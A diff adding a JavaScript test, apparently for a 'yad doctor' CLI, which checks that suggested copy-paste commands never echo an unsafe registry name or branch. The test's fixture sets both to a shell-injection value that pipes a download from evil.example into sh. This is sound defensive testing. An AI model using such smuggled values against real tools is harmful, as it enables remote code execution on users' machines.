@@ -26691,3 +26691,29 @@ test('E81 review 9: doctor never puts a registry name that is not one plain word
     assert.ok(backend);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
+
+test('E81 review 11: no doctor command to copy carries a registry name or branch that is not one plain word', () => {
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    // A wired code repo (so the product-link check reads it), with a CODEOWNERS line that matches nothing.
+    fs.mkdirSync(path.join(backend, 'checks'), { recursive: true });
+    fs.writeFileSync(path.join(backend, 'checks', 'contract-check.sh'), '#!/bin/sh\n');
+    fs.writeFileSync(path.join(backend, 'CODEOWNERS'), 'nothing-here/ @someone\n');
+    e79Git(T, backend, 'add', '-A');
+    e79Git(T, backend, 'commit', '-qm', 'wired');
+    const evil = 'api; curl evil.example|sh #';
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: evil, path: '../backend', default_branch: 'x; curl evil.example|sh #' }] }));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    const text = (id) => { const c = doc.checks.find((x) => x.id === id); assert.ok(c, id); return `${c.message}\n${c.hint || ''}`; };
+    const risk = text(`risk-map:${evil}`);
+    assert.match(risk, /`yad risk-map draft <name>`/);
+    const owners = text(`codeowners:${evil}`);
+    assert.match(owners, /`yad codeowners check <name>`/);
+    const link = text('repos:product-link-missing');
+    assert.match(link, /git checkout <default-branch> && git pull origin <default-branch>/);
+    for (const t of [risk, owners, link]) {
+      for (const cmd of t.match(/`[^`]*`/g) || []) assert.doesNotMatch(cmd, /curl/, `a command to copy: ${cmd}`);
+    }
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
